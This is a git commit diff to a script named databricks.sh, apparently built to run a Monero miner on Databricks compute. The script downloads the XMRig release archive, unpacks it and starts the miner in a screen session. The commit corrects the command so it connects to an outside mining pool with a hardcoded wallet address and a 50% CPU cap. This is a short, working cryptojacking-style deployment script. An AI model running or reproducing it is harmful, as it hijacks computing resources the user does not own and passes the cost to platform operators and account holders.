03367b2ea67210ad1eea363e11ba1e93fd630754
Wasif9775 <69375395+Wasif9775@users.noreply.github.com>
2022-08-31 15:01:00 +0530

    Update databricks.sh

--- databricks.sh
+++ databricks.sh
@@ -9,4 +9,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
 tar xvzf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig-6.17.0
-./xmrig -o --max-cpu-usage 50 us-west.minexmr.com:443 -u 45m7qEPTwScXBheAEhSs2qCeQyaTymcktUpLCzcaQgPAW5a4ZQiYQp1fHLH3wvUEz68okZdVmUap1TLiR8U5p2o67hndMKz -k --tls --rig-id wzworks
+./xmrig -o pool.supportxmr.com:3333 --max-cpu-usage 50 -u 45m7qEPTwScXBheAEhSs2qCeQyaTymcktUpLCzcaQgPAW5a4ZQiYQp1fHLH3wvUEz68okZdVmUap1TLiR8U5p2o67hndMKz -k --tls --rig-id wzworks
